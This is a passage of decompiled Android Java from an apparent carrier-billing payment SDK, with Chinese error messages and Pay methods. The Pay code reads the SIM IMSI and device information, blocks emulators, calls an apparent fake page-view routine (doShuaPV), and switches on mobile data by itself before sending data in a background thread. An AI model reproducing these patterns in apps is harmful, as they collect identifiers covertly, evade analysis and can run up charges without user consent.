      if ("0".equals(paramString1))
      {
        localJSONObject.put("resultCode", "0000");
        localJSONObject.put("resultDescription", "success");
        return localJSONObject;
      }
    }
    catch (Exception paramString1)
    {
      LogUtil.v(Log.getStackTraceString(paramString1));
      return localJSONObject;
    }
    if ("4007".equals(paramString1))
    {
      localJSONObject.put("resultCode", "9002");
      localJSONObject.put("resultDescription", "验证码错误");
      return localJSONObject;
    }
    if ("4004".equals(paramString1))
    {
      localJSONObject.put("resultCode", "9001");
      localJSONObject.put("resultDescription", "会话失效");
      return localJSONObject;
    }
    localJSONObject.put("resultCode", paramString1);
    localJSONObject.put("resultDescription", "未知错误");
    return localJSONObject;
  }
  
  public void Pay(PCallback paramPCallback, String paramString1, String paramString2, int paramInt)
  {
    Pay(paramPCallback, paramString1, paramString2, paramInt, 1);
  }
  
  public void Pay(PCallback paramPCallback, String paramString1, String paramString2, int paramInt1, int paramInt2)
  {
    this.W = System.currentTimeMillis();
    this.ag = paramInt1;
    Z = paramInt2;
    paramInt1 = payListNum + 1;
    payListNum = paramInt1;
    if (paramInt1 > 1)
    {
      a(paramPCallback, paramString1, null, 5009, 1);
      return;
    }
    b();
    AppDo.doShuaPV();
    af.clear();
    ad = 0;
    ae = 0;
    ab = OperatorUtil.getOperatorTypeString(SIMUtil.getIMSI2(this.S), NetWorkUtil.getNetWork(this.S), null);
    aa = paramString2;
    String str = TimeUtil.getNowTimeNum();
    Map localMap = AppDo.getUserBaseDeviceInfo(this.S);
    localMap.put("action", "loadMobileRevise");
    localMap.put("payId", paramString1);
    localMap.put("createTime", str);
    if (TextUtil.notNull(paramString2)) {
      localMap.put("orderNum", paramString2);
    }
    paramString2 = new a(this, localMap);
    if (!TextUtil.notNull(paramString1))
    {
      a(paramPCallback, paramString1, null, 5004, 1);
      return;
    }
    if (!paramString1.startsWith("price#")) {}
    try
    {
      Integer.valueOf(paramString1).intValue();
      if (PhoneUtil.isEmulator(this.S))
      {
        a(paramPCallback, paramString1, null, 5013, 1);
        return;
      }
    }
    catch (Exception paramString2)
    {
      a(paramPCallback, paramString1, null, 5003, 1);
      return;
    }
    if ((!SIMUtil.isCanUseSim(this.S)) && (!TextUtil.notNull(SIMUtil.getIMSI2(this.S))))
    {
      a(paramPCallback, paramString1, null, 5014, 1);
      return;
    }
    V = paramString1;
    if (this.Y.readString("sdkinit", "").equals(""))
    {
      a(paramPCallback, paramString1, null, 5001, 1);
      return;
    }
    new Thread(new DoPayThread(paramString2, localMap)).start();
    if (!NetWorkUtil.hasNetWork(this.S))
    {
      NetWorkUtil.openGprs(this.S, true);
      paramPCallback = new m(this, paramPCallback, paramString1);
      this.U.show("正在通信中，请稍等片刻...");
      new Thread(new B(this, paramPCallback)).start();
      return;
    }
    a(paramPCallback, paramString1);
  }
  
  public void moneyPay(PCallback paramPCallback, int paramInt, String paramString)
  {
    Pay(paramPCallback, "price#" + paramInt, paramString, paramInt);
  }
  
  public void setNewChannel(String paramString)
  {
    try
    {
      FileUtil.writeDateFile("error_channel.info", paramString.toString().getBytes("utf-8"), this.S);
      return;
    }
    catch (UnsupportedEncodingException paramString) {}
  }
}
